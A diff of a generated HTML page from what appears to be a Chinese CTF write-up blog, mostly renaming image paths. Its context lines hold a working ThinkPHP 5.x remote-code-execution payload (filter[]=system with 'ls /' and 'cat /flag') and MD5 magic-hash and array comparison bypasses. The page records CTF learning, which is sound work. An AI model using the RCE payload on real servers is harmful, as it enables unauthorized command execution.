@@ -111,10 +111,10 @@
 <meta property="og:locale" content="en">
 <meta property="og:image" content="http:&#x2F;&#x2F;yoursite.com&#x2F;images&#x2F;Nepnep&#x2F;ACTF2020新生赛Include-0.png">
 <meta property="og:image" content="http:&#x2F;&#x2F;yoursite.com&#x2F;images&#x2F;Nepnep&#x2F;fakegoogle0.png">
-<meta property="og:image" content="http:&#x2F;&#x2F;yoursite.com&#x2F;images&#x2F;Nepnep&#x2F;[BJDCTF%202nd]old-hack0.png">
-<meta property="og:image" content="http:&#x2F;&#x2F;yoursite.com&#x2F;images&#x2F;Nepnep&#x2F;[BJDCTF%202nd]old-hack1.png">
-<meta property="og:image" content="http:&#x2F;&#x2F;yoursite.com&#x2F;images&#x2F;Nepnep&#x2F;[BJDCTF%202nd]old-hack2.png">
-<meta property="og:updated_time" content="2020-05-08T13:31:35.527Z">
+<meta property="og:image" content="http:&#x2F;&#x2F;yoursite.com&#x2F;images&#x2F;Nepnep&#x2F;[BJDCTF2nd]old-hack0.png">
+<meta property="og:image" content="http:&#x2F;&#x2F;yoursite.com&#x2F;images&#x2F;Nepnep&#x2F;[BJDCTF2nd]old-hack1.png">
+<meta property="og:image" content="http:&#x2F;&#x2F;yoursite.com&#x2F;images&#x2F;Nepnep&#x2F;[BJDCTF2nd]old-hack2.png">
+<meta property="og:updated_time" content="2020-05-08T13:36:09.821Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:image" content="http:&#x2F;&#x2F;yoursite.com&#x2F;images&#x2F;Nepnep&#x2F;ACTF2020新生赛Include-0.png">
 
@@ -452,8 +452,8 @@
 <p>得知了考察的是任意代码执行漏洞</p>
 <h2 id="知识点-2"><a href="#知识点-2" class="headerlink" title="知识点"></a>知识点</h2><p>这里的知识点就是文章中提到的THINKPHP5.X版本的RCE</p>
 <p>原来RCE离我那么近</p>
-<h2 id="测试过程-3"><a href="#测试过程-3" class="headerlink" title="测试过程"></a>测试过程</h2><p>使用文章中的pyload进行测试<br><img src="/images/Nepnep/[BJDCTF 2nd]old-hack0.png" alt="avatar"></p>
-<p>得到如图所示的界面，接下来pyload:<br><figure class="highlight oxygene"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">_method=__construct&amp;filter[]=system&amp;<span class="function"><span class="keyword">method</span>=<span class="title">get</span>&amp;<span class="title">get</span>[]=<span class="title">ls</span> /</span></span><br></pre></td></tr></table></figure><br><img src="/images/Nepnep/[BJDCTF 2nd]old-hack1.png" alt="avatar"></p>
+<h2 id="测试过程-3"><a href="#测试过程-3" class="headerlink" title="测试过程"></a>测试过程</h2><p>使用文章中的pyload进行测试<br><img src="/images/Nepnep/[BJDCTF2nd]old-hack0.png" alt="avatar"></p>
+<p>得到如图所示的界面，接下来pyload:<br><figure class="highlight oxygene"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">_method=__construct&amp;filter[]=system&amp;<span class="function"><span class="keyword">method</span>=<span class="title">get</span>&amp;<span class="title">get</span>[]=<span class="title">ls</span> /</span></span><br></pre></td></tr></table></figure><br><img src="/images/Nepnep/[BJDCTF2nd]old-hack1.png" alt="avatar"></p>
 <p>最后cat flag<br><figure class="highlight oxygene"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">_method=__construct&amp;filter[]=system&amp;<span class="function"><span class="keyword">method</span>=<span class="title">get</span>&amp;<span class="title">get</span>[]=<span class="title">cat</span> /<span class="title">flag</span></span></span><br></pre></td></tr></table></figure></p>
 <p>得到flag</p>
 <h1 id="BJDCTF2020-Easy-MD5"><a href="#BJDCTF2020-Easy-MD5" class="headerlink" title="[BJDCTF2020]Easy MD5"></a>[BJDCTF2020]Easy MD5</h1><h2 id="分析-3"><a href="#分析-3" class="headerlink" title="分析"></a>分析</h2><p>打开之后是个查询窗口，F12也没有什么提示，所以使用BP抓包一下，得到了hint<br>Hint: select * from ‘admin’ where password=md5($pass,true)</p>
@@ -470,7 +470,7 @@
 <p>得到代码<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!--</span></span><br><span class="line"><span class="comment">$a = $GET['a'];</span></span><br><span class="line"><span class="comment">$b = $_GET['b'];</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">if($a != $b &amp;&amp; md5($a) == md5($b))&#123;</span></span><br><span class="line"><span class="comment">    // wow, glzjin wants a girl friend.</span></span><br><span class="line"><span class="comment">--&gt;</span></span><br></pre></td></tr></table></figure><br>分析源码发现是非常常规的md5碰撞或者可以采用数组</p>
 <p>方法一:md5碰撞<br>pyload:<br><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">levels91.php?<span class="attribute">a</span>=QNKCDZO&amp;b=240610708</span><br></pre></td></tr></table></figure></p>
 <p>得到源码<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php">error_reporting(<span class="number">0</span>);</span></span><br><span class="line"><span class="php"><span class="keyword">include</span> <span class="string">"flag.php"</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="php">highlight_file(<span class="keyword">__FILE__</span>);</span></span><br><span class="line"></span><br><span class="line"><span class="php"><span class="keyword">if</span>($_POST[<span class="string">'param1'</span>]!==$_POST[<span class="string">'param2'</span>]&amp;&amp;md5($_POST[<span class="string">'param1'</span>])===md5($_POST[<span class="string">'param2'</span>]))&#123;</span></span><br><span class="line"><span class="php">    <span class="keyword">echo</span> $flag;</span></span><br><span class="line"><span class="php">&#125;</span></span><br></pre></td></tr></table></figure></p>
-<p>这里由于使用了===和!== 所以只好使用数组来进行绕过<br><img src="/images/Nepnep/[BJDCTF 2nd]old-hack2.png" alt="avatar"></p>
+<p>这里由于使用了===和!== 所以只好使用数组来进行绕过<br><img src="/images/Nepnep/[BJDCTF2nd]old-hack2.png" alt="avatar"></p>
 <p>得到flag</p>
 <p>方法二：数组<br>pyload:<br><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">levels91.php?a[]=<span class="number">1</span>&amp;b[]=<span class="number">2</span></span><br></pre></td></tr></table></figure></p>
 <p>后面的步骤与方法一相同 这里不再细说</p>
